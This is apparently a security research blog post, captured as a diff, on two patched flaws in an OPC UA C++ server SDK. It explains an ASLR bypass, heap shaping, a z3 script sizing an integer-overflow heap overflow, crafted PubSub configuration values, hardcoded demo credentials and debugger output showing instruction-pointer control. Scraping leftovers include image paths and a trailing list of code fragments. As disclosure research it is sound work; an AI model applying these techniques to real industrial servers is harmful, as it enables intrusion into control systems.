@@ -1,0 +1,400 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214424_659019\Pwn2OwnIndustrialHackingContest2863x3001.png
+
+The JFrog Security team recently competed in the Pwn2Own Miami 2022 hacking competition which focuses on Industrial Control Systems (ICS) security. One of our research targets for the competition was the Unified Automation C++-based OPC UA Server SDK.
+Other than the vulnerabilities we disclosed as part of the pwn2own competition, we managed to find and disclose eight additional vulnerabilities to the vendor. These vulnerabilities were fixed in the SDK in version 1.7.7.
+Due to pwn2own’s time and stability constraints, we were unable to present a remote code execution exploit chain using our disclosed vulnerabilities at the time. However – in this blog we will show that by exploiting two of the disclosed vulnerabilities, an Info Leak and Heap Overflow, an attacker can achieve remote code execution on UA’s C++ OPC demo server, which is an OPC UA server that’s designed to showcase OPC UA’s capabilities.
+It is important to note that while both vulnerabilities affect the UA’s OPC UA stack, in order to exploit them a user has to be authenticated with high-privileges.
+In the demo server the username and password for both regular and admin users are hardcoded into the binary, which we used to our advantage when exploiting the vulnerabilities.
+What is OPC UA?
+We’ve previously elaborated on OPC UA and its uses, so check out our pwn2own-related blog post for more information on the actual protocol.
+The Vulnerabilities
+Vuln #1 – UaUniString out-of-bounds read infoleak
+The OPC UA protocol allows reading and writing into “nodes”. Nodes are the basic data container type in the OPC UA protocol. Each node has a type associated with it such as a string, integer, double, union etc.
+We can read and write to a node using the Read and Write request of the protocol.
+For example, the UA C++ demo server allows us to read and write to both string and string arrays.
+The UaUniString::UaUniString is a constructor used for converting a UTF-8 string that resides in other argument into a UTF-16 string that will held in a UaUniString object
+The UaUniString::UaUniString function is vulnerable to an out of bounds read vulnerability:
+void __thiscall UaUniString::UaUniString(UaUniString *this, const char *other)
+{
+...
+  thisa = this;
+  if ( other )
+  {
+    // Calculate string length
+    iWLen = 0;
+    for ( i = 0; other[i]; ++i )
+    {
+      c = other[i];
+      if ( c >= 128 )
+      {
+        if ( (c & 0xE0) == '\xC0' )
+        {
+          ++i;
+          ++iWLen;
+        }
+        else if ( (c & 0xF0) == '\xE0' )
+        {
+          i += 2;
+          ++iWLen;
+        }
+        else if ( (c & 0xF8) == '\xF0' )
+        {
+          i += 3;
+          ++iWLen;
+        }
+        ...
+      }
+      else
+      {
+        ++iWLen;
+      }
+    }
+ 
+    iLen = i;
+    pData = OpcUa_Memory_Alloc(2 * iWLen + 2);
+    iLenUsed = 0;
+    for ( ia = 0; ia <= iLen; ++ia ) { v5 = other[ia]; if ( v5 >= 0x80 )
+      {
+   ...
+       else if ( (v5 & 0xF8) == '\xF0' )
+        {
+          pData[iLenUsed++] = '?';
+          ia += 3;
+        }
+        else if ( (v5 & 0xFC) == '\xF8' )
+        {
+          pData[iLenUsed++] = '?';
+          ia += 4;
+        }
+        else if ( (v5 & 0xFE) == '\xFC' )
+        {
+          pData[iLenUsed++] = '?';
+          ia += 5;
+        }
+      }
+      else
+      {
+        pData[iLenUsed++] = other[ia];
+      }
+    }
+The first for loop, calculates the length of the string via the iWLen variable. When the loop  gets to a special character (for example 0xE0) it increments the variable used for indexing other (the i variable) by more than one, without checking if this operation would skip over the other’s NULL terminator character, thus ending up with an iWLen bigger than the original string’s length.
+
+After the length calculation, the function allocates a new UTF-16 array for the converted string based on iWLen.
+Later, the second for loop copies the string with the length that was calculated before, this would copy any character under 0x80 into the new buffer except some special characters that would be returned as ?.
+Because the new string buffer will be written up to iLen which may be out of bounds, the new string will contain “leaked” data. Specifically – heap memory that succeeds the original string.
+
+By using the index_range parameter in the Read request for a string node in the OPC UA protocol, the server calls this function and returns the data to the client.
+Since it is possible to write to an arbitrary node in the demo server (a reference example of Unified automation for OPC UA server development), we can trigger the vulnerability and get out-of-bounds memory returned to us.
+In order to exploit this vulnerability outside the demo server as long as the server export a string that we can read and write to, we could exploit this vulnerability
+We were able to bypass ASLR by using the following technique:
+
+Find an object with a vtable with the two lower bytes lower than 0x80
+Write a string array of length 50 with each string in the size of our desirable object (so the heap allocator will allocate them in the same bucket)
+
+The desirable object is an object we want to “leak” in order to read a pointer from the object data and break the ASLR mechanism. The exact object depends on the version of the OPC UA stack – more on that later…
+
+The desirable object is an object we want to “leak” in order to read a pointer from the object data and break the ASLR mechanism. The exact object depends on the version of the OPC UA stack – more on that later…
+Write a string array of length 1 with a string in the size of our desired object,which causes the server to free the previous 50 strings and allocate the new one.
+Write a string with 0xE0 as the last character
+Send a request to create the desired object
+Read the string to get data from memory
+If desired pattern found in data end the loop and calculate image base for the C++ dermo server binary, otherwise repeat
+Once we have the image base we can use ROP gadgets inside in C++ demo server for exploitation on the other vulnerability described in this blog
+We used steps #2 and #3 as heap shaping primitives in order to make our desirable object just after the string we are leaking.
+Due to ZDI’s desire to make the environment as close to reality as possible, the targets were run on the latest Windows 10 64-bit with every mitigation technique enabled (ASLR, NX and so on).
+The userspace frontend heap allocator in Windows 10 is called segment heap, for our allocation size it uses a heap allocator called LFH (Low Fragmentation Heap). There’s a great lecture by Saar Amar on the topic.
+We are allocating the same size of our desirable object because the LFH implementation will allocate similar sized objects in the same memory block.
+As mentioned, we set out to exploit the UA C++ demo server. Since it is a 32-bit binary the ASLR randomizes only the second byte, so given the address 0xAABBCCDD only the “0xBB” byte will be randomized. Therefore – we need to find an object with a vtable where its lowest two bytes (0xCC and 0XDD in our example) adhere to the limitation of the leak (byte values are below 0x80) so we would leak it’s vptr on the heap, We found multiple objects that satisfy this requirement, depending on the version of the demo server.
+For example, when leaking the vtable of the object UaSubscription, the leaked data looks like –
+
+42424242…2d21723f24220501c28003
+We looked for the pattern of 0x2224 since those are the lower bytes to UaSubscription table, thus the vtable address is 0x01052224 and the offset of the vtable from the image base is 0x752224, thus the image base is 0x00900000.
+Because of the 0x80 limitation, our ASLR bypass seemed to work only 50% of the time for a specific object. This can be improved by finding more objects that suit our limitations which are furthest away from each other as possible. We experimented with this method and managed to improve the leak success rate to ~62%.
+It’s worth mentioning that the ASLR offset of a module in Windows 10 randomizes only once per boot (and not each time the process is restarted) which makes things a bit harder in our case, since if the desired vtable and randomized image base has an illegal character (0x80 or above) our leak will fail until the next boot. Fortunately, we can try leaking another object in this case until we succeed.
+Vuln #2 – replaceArgEscapes() heap overflow
+The function UaString::arg() takes a format string as input and returns a new string where every %1 sequence in the string is replaced with the supplied argument.
+An example usage of this function –
+
+“%1.%2”.arg(s1).arg(s2)
+If s1 and s2 are regular strings, for example s1 = “AAAA” and s2 = “BBBB”, then the result string will be “AAAA.BBBB” as expected. However, if s1 = “%1” and s2 = “BBBB” then the intermediate string would be “%1.%2”.arg(s2) and the result string will be “BBBB.%2”, placing the “BBBB” at the start of the result string instead of after the dot.
+UaString::arg() calls findArgEscapes(ArgEscapeData *d, const UaString *s) which sets d->occurences to the number of the lowest argument id in the format string (i.e for %1%1%2 the function will only count the number of “%1” occurrences and thus set d->occurences to 2). The function also sets d->escape_len to the accumulated length of all of the arguments in the string (in the previous example it will be 4 as the length of the term “%1%1” is 4).
+Later, UaString::arg() will call replaceArgEscapes() in order to replace the lowest argument id with the given argument string. replaceArgEscapes() will allocate a buffer that should be big enough to contain the string after the replacements:
+UaString *replaceArgEscapes(UaString *result, const UaString *fmt_string, const ArgEscapeData *d, int field_width, const UaString *arg, const UaChar *fillChar)
+{
+   ...
+   v__field_width_abs = uaAbs(&field_width);
+   v__fmt_string_size = UaString::size((UaString *)fmt_string);
+   v__arg_size = UaString::size((UaString *)arg);
+   v__size_without_escape_len = v__fmt_string_size - d->escape_len;
+   len = *uaMax(&v__field_width_abs, &v__arg_size) * d->occurrences +
+   v__size_without_escape_len;
+   buf = (char *)OpcUa_Memory_Alloc(len + 1);
+   ...
+}
+Unfortunately, there is an integer overflow in this code. The code calculates the required allocation size as such –
+
+max(abs(field_width), arg_size) * d->occurences + (fmt_string_size - d->escape_len)
+and the result is assigned to an unsigned integer.
+This calculation might lead to an integer overflow when the parameters are too large, for example if the format string is contains 0x10000 repetitions of %1, arg_size (size of the replacement data) is 0x10001 bytes long and field_width is 1 then d->occurrences will be 0x10000, the fmt_string_size will be 0x20000 and d->escape_len will be also 0x20000. These numbers brings the result of 0x10001*0x10000 + 0 = 0x10000. This will result in an allocated buffer with a size that is smaller than expected.
+Later, replaceArgEscapes() will copy the format string to the allocated buffer, where for each argument slot (“%1”) it will write the argument string:
+while ( fmt_ptr != fmt_end_ptr )
+{
+    v__fmt_before_arg_id = fmt_ptr;
+    // find next arg id
+    while ( *fmt_ptr != '%' )
+        fmt_ptr = fmt_ptr + 1;
+ 
+    ...
+ 
+    if ( v__arg_id == d->min_escape )
+    {
+        // its the minimal arg id - we should replace the argument
+        ...
+        // copy everything before the arg id to buf
+        memcpy(v__buf_ptr, v__fmt_before_arg_id, v__fmt_arg_id_ptr - v__fmt_before_arg_id);
+ 
+        ...
+ 
+        // copy argument instead of the argument id to buf
+        arg_data = UaString::toUtf8((UaString *)arg);
+        memcpy(v__buf_ptr, arg_data, arg_size);
+ 
+        ...
+ 
+        // if it's the last occurence of the argument id
+        if ( ++v__counter == d->occurrences )
+        {
+            // copy the rest of the format string
+            memcpy(v__buf_ptr, fmt_ptr, fmt_end_ptr - (_BYTE *)fmt_ptr);
+            v__buf_ptr = (char *)v__buf_ptr + fmt_end_ptr - (_BYTE *)fmt_ptr;
+            fmt_ptr = fmt_end_ptr;
+        }
+    }
+    else
+    {
+        // we should not replace this argument id - copy both the string before the argument id and the argument id itself
+        memcpy(v__buf_ptr, v__fmt_before_arg_id, (_BYTE *)fmt_ptr - (_BYTE *)v__fmt_before_arg_id);
+        v__buf_ptr = (char *)v__buf_ptr + (_BYTE *)fmt_ptr - (_BYTE *)v__fmt_before_arg_id;
+    }
+}
+This will lead to a heap out-of-bounds write and can be exploited for remote code execution.
+UA’s OPC server supports the PubSub protocol, a protocol that publishes data over the MQTT or UADP protocols. A user with admin privileges in the OPC server can upload a PubSub configuration to the server in order to define datasets that the data will be taken from. Implementing the authentication method is left to the end-user and as such any authentication method is possible. In the demo server, the authentication method was simply plaintext comparison:
+UaStatus MyServerCallback::logonSessionUser(Session* pSession, UaUserIdentityToken* pUserIdentityToken, ServerConfig* pServerConfig) {
+    ...
+    else if ( pUserIdentityToken->getTokenType() == OpcUa_UserTokenType_UserName ) {
+        ...
+        if ((pUserPwToken->sUserName == "root" && pUserPwToken->sPassword == "secret") ||
+                (pUserPwToken->sUserName == "joe" && pUserPwToken->sPassword == "god") ||
+                (pUserPwToken->sUserName == "john" && pUserPwToken->sPassword == "master") ||
+                (pUserPwToken->sUserName == "sue" && pUserPwToken->sPassword == "curly") ||
+                (pUserPwToken->sUserName == "sam" && pUserPwToken->sPassword == "serious"))
+            {
+                ...
+            }
+    }
+}
+This is not a secured authentication method, since an attacker can brute-force the password by using a timing attack.
+As part of the PubSub configuration parsing, the function OpcUa::DataSetReaderType::setMirror() will be called if a mirror reader dataset is defined (a dataset that replicates another reader dataset). The setMirror() function will call  UaString::arg() several times in order to set a name for the dataset’s newly-generated fields:
+UaString PubSub_name = UaString('PubSub.%1.%2.%3')
+    .arg(PubSubConf->Connection->Name)
+    .arg(PubSubConf->Connection->ReaderGroups[0]->Name)
+    .arg(PubSubConf->Connection->ReaderGroups[0]->DataSetReaders[0]->Name);
+ 
+UaString tmp = UaString("%1.SubscribedDataSet").arg(PubSub_name);
+UaString subName = UaString("%1.%2")
+    .arg(tmp)
+    .arg(PubSubConf->Connection->ReaderGroups[0].DataSetReaders[0]->SubscribedDataSet->ParentNodeName);
+ 
+ 
+PubSubConf->Connection->ReaderGroups[0].DataSetReaders[0]->getDataSetMetaData(
+    PubSubConf->Connection->ReaderGroups[0].DataSetReaders[0], &dataSetMetaData);
+UaDataSetMetaDataType::getFields(&dataSetMetaData, &fields);
+ 
+for (int i = 0; i < UaFieldMetaDatas::length(&fields) { UaString fieldName = UaString('%1.%2').arg(subName, fields[i]->name);
+}
+Figure 1: A simplification of the relevant code parts in OpcUa::DataSetReaderType::setMirror()
+Note that OpcUa::DataSetReaderType::setMirror() is called after PubSub_name is already defined.
+An attacker may set –
+PubSubConf.Connection.Name = '%1' * conn_name_sz
+PubSubConf.Connection.ReaderGroups[0].Name = '%0' + '%1' * reader_name_sz
+PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].Name = 'A' * datasetReader_sz
+PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].SubscribedDataSet.ParentNodeName = '%1' * pMirror_sz
+fields[0].Name = 'B' * field_sz
+Where the variables conn_name_sz, reader_name_sz, datasetReader_sz, pMirror_sz and field_sz are integer variables that we can control.
+This will cause the last UaString::arg() to use the following format string –
+fmt_string = 'PubSub.'
+fmt_string += conn_name_sz * PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].Name
+fmt_string += '%1' * conn_name_sz * reader_name_sz * pMirror_sz
+fmt_string += '.%2.%2.SubscribedDataSet.%2.%2'
+And the exact allocated size will be –
+consts_size = len("PubSub..%2.%2.SubscribedDataSet.%2.%2")
+allocated_sz = (conn_name_sz * reader_name_sz * pMirror_sz * field_sz + conn_name_sz * datasetReader_sz + consts_size + 1) & 0xFFFFFFFF
+Figure 2: the equation of the size that will be allocated after running the code in Figure 1
+To exploit the vulnerability, allocated_sz should be set to a smaller number than the overall write size. This will cause an out-of-bounds write over (hopefully) sensitive heap data. allocated_sz must also be in a specific range so that the LFH allocator will allocate the buffer in the same bucket as the object we’d like to override. As usual, this is an object with function pointers that we will override with a pointer to our ROP chain.
+Note that the shellcode will be in fields[0].Name, which will be written iteratively, and also in PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].Name.
+In order to satisfy all of the mentioned conditions, we used z3, a theorem prover developed by Microsoft Research. We used it in order to get a solution for the equation in figure 2, given the possible range of values for allocated_sz. We had to add the above equation with some restrictions. First of all, a string cannot be longer than 1000 characters, since when parsing the PubSub configuration, if a string field is longer than g_appconfig.encoder.max_string_length (1000 by default) then ua_decode_string() fails. Since “%1” is two characters – then conn_name_sz, reader_name_sz and pMirror_sz cannot be bigger than 1000/2 = 500 characters. Actually, reader_name_sz cannot be bigger than 499, because there is a call to UaString::arg() with the datasetReader_name (PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].Name) as an argument, so if we will supply only one argument identifier (“%1”) in reader_name (PubSubConf.Connection.ReaderGroups[0].Name) – it will just replace that argument with datasetReader_name. So it could be reasonable to set datasetReader_name to “%1”’s as well, however, datasetReader_name must not be flooded with “%1” like the other variables, because that will lead to a crash due to a NULL dereference caused by a failed huge allocation in another UaString::arg() call. That’s why we set reader_name to “%0” + “%1” * reader_name_sz and datasetReader_name to “A” * datasetReader_sz.
+Adding those rules in z3 looks like this –
+import z3
+ 
+# PubSubConf.Connection.Name
+conn_name = z3.BitVec('conn_name', 32)
+# PubSubConf.Connection.ReaderGroups[0].Name
+reader_name = z3.BitVec('reader_name', 32)
+# PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].Name
+datasetReader_name = z3.BitVec('datasetReader_name', 32)
+#  PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].SubscribedDataSet.ParentNodeName
+mirror = z3.BitVec('mirror', 32)
+# fields[0].Name
+field = z3.BitVec('field', 32)
+ 
+s = z3.Solver()
+s.add(0 <= conn_name)
+s.add(0 < reader_name)
+s.add(0 <= datasetReader_name)
+s.add(0 <= mirror)
+s.add(conn_name <= 500)
+s.add(reader_name <= 500)
+s.add(datasetReader_name <= 1000)
+s.add(mirror <= 500)
+s.add(0 <= field)
+s.add(field <= 1000)
+Now, we want to make sure that there will be an integer overflow in the calculation of allocated_sz. This can be done by adding the following constraint –
+consts_size = len("PubSub..%2.%2.SubscribedDataSet.%2.%2")
+v__len_before = conn_name*reader_name*mirror + conn_name*datasetReader_name
+v__len = conn_name*reader_name*mirror*field + conn_name*datasetReader_name + consts_size + 1
+s.add(v__len_before > v__len)
+Where v__len_before is the size of the format string and v__len is the allocated size. By adding the constraint v__len_before > v__len we are making sure that v__len_before will be a big number and also that there will be an integer overflow when calculating v__len.
+Finally, we want to make sure that the allocated size will be in the bucket range, and also that the writes will be aligned to the bucket’s buffer size including the buffer metadata size. Otherwise, the iterative writes will be messed up and we will override the target object with the second half of our shellcode. So we add more constraints –
+v__before_datasetReader_sz = len('PubSub.')
+s.add(field % ALIGNMENT == 0)
+s.add((datasetReader_name + v__before_datasetReader_sz) % ALIGNMENT == 0)
+s.add(START_RANGE <= v__len)
+s.add(v__len <= END_RANGE)
+Where ALIGNMENT is the size of the LFH bucket’s buffer including the metadata, START_RANGE and END_RANGE define a range of sizes, such that any size in that range will end up allocating END_RANGE (ALIGNMENT = END_RANGE + metadata’s size).
+Solving with z3 –
+result = s.check()
+print('check result: {}'.format(result))
+if result == z3.sat:
+    # get a logic model that satisfies all of the constraints
+    model = s.model()
+    print('declarations:\n----')
+    print(f'''conn_name_sz = {model[conn_name]}
+reader_name_sz = {model[reader_name]}
+datasetReader_sz = {model[datasetReader_name]}
+pMirror_sz = {model[mirror]}
+field_sz = {model[field]}''')
+    print('----')
+    print('allocation size = {} (len)'.format(model.eval(v__len)))
+Those rules are not solvable for every value of ALIGNMENT, START_RANGE and END_RANGE, but there were enough values and respective solutions that suited our needs.
+Using the above script we have an easy way to create a heap overflow in our bucket. Now – we need to find a heap-based object to overwrite. We searched the demo server binary and uastack.dll for a suitable object and found the OpcUa_EndpointContext object. As always, the easiest objects to exploit for RCE would be objects that have immediate function pointers in them, or objects with a virtual function table.
+Since our overflow will eventually lead to a crash (since we are copying 4GB of data on a much smaller buffer) our exploit strategy is to start the overflow hoping to override the desired object and in a second thread try to trigger the relevant function pointer (before the first “copier” thread causes a process crash).
+Running the full exploit on the pwn2own-specified target (Windows 10 64-bit running the latest update) we managed to get control of EIP!
+Here is the WinDBG output from a relevant session:
+(120c.1170): Access violation - code c0000005 (first chance)
+##############
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+ 
+eax=01208224 ebx=043d7600 ecx=ffffffff edx=01208224 esi=03b6adb0 edi=04d1bd00
+eip=01208224 esp=0707f9c4 ebp=ffffffff iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+ 
+uaservercpp+0x878224:
+01208224 1882200180c8    sbb     byte ptr [edx-377FFEE0h],al ds:002b:c9a08344=??
+This address (0x1208218) is in fact a pointer in the data section for another place in the data section
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214424_659019\1_datasection.png
+
+We used this address so the overwritten object would be able to read or write to this address and won’t crash the demo server before we get control of EIP.
+Unfortunately – the exploit’s success rate was not high enough for the pwn2own competition (only 3 exploitation tries) due to the randomization of the LFH allocator when getting a free chunk, since we can only overflow once and if we fail we crash the process without a second try. This is because the PubSub config file that we use for creating the overflow, persists on disk and thus restarting the demo server after a failed overflow will cause an immediate crash when trying to load our malicious configuration.
+We believe with more time, targeting other objects and/or targeting other operating systems, this set of vulnerabilities can be turned into a stable RCE exploit.
+Acknowledgement
+We would like to thank Unified Automation for promptly and professionally handling this issue. We also encourage you to follow the latest discoveries and technical updates from the JFrog Security Research team in our security research blog posts and on Twitter @JFrogSecurity.
+UaUniString::UaUniString
+other
+UaUniString::UaUniString
+for
+iWLen
+0xE0
+other
+other
+iWLen
+iWLen
+for
+?
+iLen
+index_range
+
+The desirable object is an object we want to “leak” in order to read a pointer from the object data and break the ASLR mechanism. The exact object depends on the version of the OPC UA stack – more on that later…
+UaString::arg()
+%1
+“%1.%2”.arg(s1).arg(s2)
+UaString::arg()
+findArgEscapes(ArgEscapeData *d, const UaString *s)
+d->occurences
+%1%1%2
+%1
+d->occurences
+d->escape_len
+UaString::arg()
+replaceArgEscapes()
+replaceArgEscapes()
+max(abs(field_width), arg_size) * d->occurences + (fmt_string_size - d->escape_len)
+%1
+arg_size
+field_width
+d->occurrences
+fmt_string_size
+d->escape_len
+replaceArgEscapes()
+%1
+OpcUa::DataSetReaderType::setMirror()
+setMirror()
+UaString::arg()
+OpcUa::DataSetReaderType::setMirror()
+conn_name_sz
+reader_name_sz
+datasetReader_sz
+pMirror_sz
+field_sz
+UaString::arg()
+allocated_sz
+fields[0].Name
+PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].Name
+allocated_sz
+g_appconfig.encoder.max_string_length
+ua_decode_string()
+%1
+conn_name_sz
+reader_name_sz
+pMirror_sz
+reader_name_sz
+UaString::arg()
+datasetReader_name
+PubSubConf.Connection.ReaderGroups[0].DataSetReaders[0].Name
+%1
+reader_name
+PubSubConf.Connection.ReaderGroups[0].Name
+%1
+datasetReader_name
+%1
+%0
+%1
+reader_name_sz
+datasetReader_name
+datasetReader_sz
+allocated_sz
+v__len_before
+v__len
+v__len_before > v__len
+v__len_before
+v__len
+ALIGNMENT
+START_RANGE
+END_RANGE
+END_RANGE
+ALIGNMENT
+END_RANGE
+ALIGNMENT
+START_RANGE
+END_RANGE
